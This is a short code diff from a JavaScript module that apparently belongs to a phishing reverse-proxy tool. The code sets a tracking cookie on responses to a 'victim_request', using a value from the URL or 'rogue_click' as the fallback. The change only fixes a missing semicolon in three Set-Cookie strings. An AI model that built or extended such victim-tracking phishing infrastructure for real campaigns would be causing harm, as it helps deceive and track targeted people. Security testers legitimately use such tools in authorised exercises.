@@ -21,7 +21,7 @@ module.exports = {
           //param_search_regex = new RegExp(config[humble_domain].search_string + '=[^\&]*')
           //tracking_value = victim_request.url.match(param_search_regex)[0].split('=')[1]
           tracking_value = victim_request.url.match(param_search_regex)[1]
-          set_cookies.push(config[humble_domain].tracking_cookie + "=" + tracking_value + ";domain=" + humble_domain + "Path=/;Secure;httponly")
+          set_cookies.push(config[humble_domain].tracking_cookie + "=" + tracking_value + ";domain=" + humble_domain + ";Path=/;Secure;httponly")
           //switch the semaphore back off
           set_cookie = false
         } catch(err) {
@@ -29,9 +29,9 @@ module.exports = {
           try{
             param_search_regex = new RegExp(config[humble_domain].search_string + '=[^\&]*')
             tracking_value = victim_request.url.match(param_search_regex)[0].split('=')[1]
-            set_cookies.push(config[humble_domain].tracking_cookie + "=" + tracking_value + ";domain=" + humble_domain + "Path=/;Secure;httponly")
+            set_cookies.push(config[humble_domain].tracking_cookie + "=" + tracking_value + ";domain=" + humble_domain + ";Path=/;Secure;httponly")
 	  }catch(err){
-            set_cookies.push(config[humble_domain].tracking_cookie + "=" + "rogue_click" + ";domain=" + humble_domain + "Path=/;Secure;httponly")
+            set_cookies.push(config[humble_domain].tracking_cookie + "=" + "rogue_click" + ";domain=" + humble_domain + ";Path=/;Secure;httponly")
 	  }
           set_cookie = false
           res.headers["set-cookie"] = set_cookies
